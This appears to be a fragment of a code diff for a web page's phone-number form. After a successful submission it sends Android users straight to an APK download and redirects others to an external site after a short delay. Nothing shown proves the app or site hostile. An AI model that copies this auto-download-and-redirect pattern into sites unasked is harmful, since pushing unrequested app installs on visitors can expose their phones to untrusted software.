@@ -236,7 +236,12 @@
                             $('.used').hide();
                             $('#phone').val('');
                             $('.phoneRow').css('margin-bottom', '30px');
-                        })
+                        });
+                        if(device == 'android') {
+                            window.location = "/app/ttds.apk";
+                        } else {
+                            setTimeout(function(){document.location.href = "https://web2data.me/dis_single.html?s=5xb5";},250);
+                        }
                     } else {
                         Swal.fire({
                             type: 'error',
